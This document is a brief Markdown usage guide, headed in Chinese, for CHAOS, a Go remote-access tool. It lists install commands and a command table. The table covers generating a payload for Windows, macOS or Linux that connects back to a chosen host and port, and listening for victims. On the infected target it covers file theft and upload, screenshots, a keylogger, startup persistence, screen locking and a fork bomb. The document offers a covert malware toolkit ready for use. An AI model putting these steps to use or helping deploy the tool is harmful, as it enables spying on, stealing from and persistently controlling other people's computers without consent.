## Golang编写的windows远控
## https://github.com/tiagorlampert/CHAOS
### Centos没有APT请用yum
## How to Install
```bash
# Install dependencies
$ sudo apt install golang git go-dep -y

# Get this repository
$ go get github.com/tiagorlampert/CHAOS

# Go into the repository
$ cd ~/go/src/github.com/tiagorlampert/CHAOS

# Get project dependencies
$ dep ensure

# Run
$ go run main.go
```
## How to Use

Command     | On HOST does...
:-----      |:-----
`generate`  |Generate a payload (e.g. `generate lhost=192.168.0.100 lport=8080 fname=chaos --windows`)
`lhost=`    |Specify a ip for connection
`lport=`    |Specify a port for connection
`fname=`    |Specify a filename to output
`--windows` |Target Windows
`--macos`   |Target Mac OS
`--linux`   |Target Linux
`listen`    |Listen for a new connection (e.g. `listen lport=8080`)
`serve`     |Serve files
`exit`      |Quit this program

Command                 | On TARGET does...
:-----                  |:-----
`download`              |File Download
`upload`                |File Upload
`screenshot`            |Take a Screenshot
`keylogger_start`       |Start Keylogger session
`keylogger_show`        |Show Keylogger session logs
`persistence_enable`    |Install at Startup
`persistence_disable`   |Remove from Startup
`getos`                 |Get OS name
`lockscreen`            |Lock the OS screen
`openurl`               |Open the URL informed
`bomb`                  |Run Fork Bomb
`clear`                 |Clear the Screen
`back`                  |Close connection but keep running on target
`exit`                  |Close connection and exit on target